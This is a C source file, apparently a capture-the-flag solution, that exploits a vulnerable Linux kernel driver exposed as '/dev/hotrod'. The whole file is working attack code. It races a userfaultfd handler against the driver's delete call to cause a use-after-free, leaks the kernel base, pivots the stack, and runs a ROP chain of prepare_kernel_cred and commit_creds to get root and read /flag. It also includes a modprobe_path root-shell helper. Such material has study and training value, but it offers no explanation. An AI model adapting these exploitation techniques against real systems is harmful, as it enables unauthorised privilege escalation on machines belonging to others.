#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>

// commands
#define DEV_PATH "/dev/hotrod"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define PIVOT_ADDR 0xcafe000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 1;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

static void get_shell()
{
    puts("get_shell called");
    if (!getuid())
	{
        char flag[0x40];
        read(open("/flag", O_RDONLY), flag, 0x40);
        puts(flag);
	}
	exit(0);
}

#define HOTROD_CREATE   0xbaadc0de
#define HOTROD_EDIT     0xdeadc0de
#define HOTROD_DELETE   0xc001c0de
#define HOTROD_GET      0x1337c0de

typedef struct
{
    size_t sz;
    uint8_t* data;
} req_t;

static void create(int fd, size_t sz)
{
    if (ioctl(fd, HOTROD_CREATE, sz) < 0) {
        errExit("HOTROT_CREATE");
    }
}

static void edit(int fd, uint8_t* data, size_t sz)
{
    req_t req = {0};
    req.sz = sz;
    req.data = data;

    if (ioctl(fd, HOTROD_EDIT, &req) < 0) {
        errExit("HOTROT_EDIT");
    }
}

static void delete(int fd)
{
    if (ioctl(fd, HOTROD_DELETE, NULL) < 0) {
        errExit("HOTROT_DELETE");
    }
}

static void get(int fd, uint8_t* data, size_t sz)
{
    req_t req = {0};
    req.sz = sz;
    req.data = data;

    if (ioctl(fd, HOTROD_GET, &req) < 0) {
        errExit("HOTROD_GET");
    }
}

static unsigned page_size;
static int fd;
static uint64_t k_base;
// 0xffffffff81027b86 : mov esp, dword ptr [rdi] ; lea rax, [rax + rsi*8] ; ret
static uint64_t mov_esp_val;
static uint64_t pop_rdi_ret;
//0xffffffff8108baca: mov rdi, rax; call 0x2d1350; mov rax, -9; pop rbp; ret;
static uint64_t mov_rdi_rax_call_pop1;
static uint64_t prepare_kernel_cred;
static uint64_t commit_creds;
static uint64_t kpti_tramp;

static void* handler(void *arg)
{
    puts("Handler thread started");
    struct uffd_msg msg;
    int uffd = (int) arg;
    char* page = NULL;
    struct uffdio_copy uffdio_copy;

    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    uint64_t* p_page = (uint64_t*)page;

    if (page == MAP_FAILED) {
        errExit("mmap");
    }

    for (;;) {
        int ret;
        struct pollfd pollfd;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;

        ret = poll(&pollfd, 1, -1);

        if (ret < 0) {
            errExit("poll");
        }
        
        printf("poll() returns: nready = %d; "
                "POLLIN = %d; POLLERR = %d\n", ret,
                (pollfd.revents & POLLIN) != 0,
                (pollfd.revents & POLLERR) != 0);

        ret = read(uffd, &msg, sizeof(msg));

        if (ret == 0) {
            printf("EOF on userfaultfd \n");
            exit(EXIT_FAILURE);
        }

        if (ret < 0) {
            errExit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            printf("Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        printf("UFFD_EVENT_PAGEFAULT event: ");
        printf("flags = %p; ", msg.arg.pagefault.flags);
        printf("address = %p \n", msg.arg.pagefault.address);

        delete(fd);
        create_timer(0);

        // pivot address
        p_page[0x0] = PIVOT_ADDR + 0x400;
        p_page[0x3] = 0x000000000eae0e65;
        p_page[0x4] = 0x000000000eae0e65;
        p_page[0x5] = mov_esp_val;
       
        uffdio_copy.src = (uint64_t) page;
        uffdio_copy.dst = (uint64_t) msg.arg.pagefault.address & ~(page_size -1); 
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;

        ret = ioctl(uffd, UFFDIO_COPY, &uffdio_copy);

        if (ret < 0) {
            errExit("UFFDIO_COPY");
        }

        printf("Number of bytes copied: %lld \n", uffdio_copy.copy);
    }

}

void build_rop(uint64_t* buf)
{
    unsigned off = 0x400 / 8;
    buf[off++] = pop_rdi_ret;
    buf[off++] = 0x0;
    buf[off++] = prepare_kernel_cred;
    buf[off++] = mov_rdi_rax_call_pop1;
    buf[off++] = 0x0;
    buf[off++] = commit_creds;
    buf[off++] = kpti_tramp + 22;
    buf[off++] = 0x0;
    buf[off++] = 0x0;

    uint64_t user_rip = (uint64_t)get_shell;
    save_state();
    buf[off++] = user_rip;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    buf[off++] = 0x414243;
}

// max size = 0xf0 
int main(void)
{
    int ret;
    fd = open(DEV_PATH, O_RDONLY);
    int uffd = userfaultfd(O_CLOEXEC | O_NONBLOCK);
    void* addr;
    pthread_t tid;

    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;

    if (fd < 0) {
        perror("open");
        return -1;
    }

    if (uffd < 0) {
        perror("userfaultfd");
        return -1;
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;

    ret = ioctl(uffd, UFFDIO_API, &uffdio_api);

    if (ret < 0) {
        errExit("uffdio api");
    }

    page_size = sysconf(_SC_PAGE_SIZE);

    size_t len = page_size * 4;

    uint64_t fault_addr = FAULT_ADDR;

    addr = mmap(fault_addr, len, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    printf("Mmaped address: %p \n", addr);
    if (addr == MAP_FAILED) {
        errExit("mmap");
    }

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    
    ret = ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

    if (ret < 0) {
        errExit("uffdio register");
    }

    ret = pthread_create(&tid, NULL, handler, (void*)uffd);
    if (ret != 0) {
        errno = ret;
        errExit("pthread_create");
    }

    uint8_t buf[0x100] = {0};
    uint64_t* p_buf = (uint64_t*)buf;

    create_timer(1);
    create(fd, 0xf0);
    get(fd, buf, 0xf0);

    //print_hex8(buf, 0xf0);

    uint64_t leak = p_buf[5];
    k_base = leak - 0x102a00;
    mov_esp_val = k_base + 0x27b86;
    pop_rdi_ret = k_base + 0xb689d;
    prepare_kernel_cred = k_base + 0x53680;
    commit_creds = k_base + 0x537d0;
    mov_rdi_rax_call_pop1 = k_base + 0x8baca;
    kpti_tramp = k_base + 0x200cb0;

    printf("Kernel base: %p \n", k_base);
    printf("Mov esp gadget: %p \n", mov_esp_val);
    printf("commit_creds: %p \n", commit_creds);
    printf("mov rdi, rax..: %p \n", mov_rdi_rax_call_pop1);

    void* rop_buf = mmap((void*)(PIVOT_ADDR & ~0xfff), page_size * 4,
                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS 
                        | MAP_FIXED, -1, 0);

    if (rop_buf == MAP_FAILED) {
        errExit("mmap");
    }

    build_rop(rop_buf);

    // trigger page_fault
    edit(fd, (uint8_t*)fault_addr, 0xf0);

    pthread_join(tid, NULL);

    return 0;
}
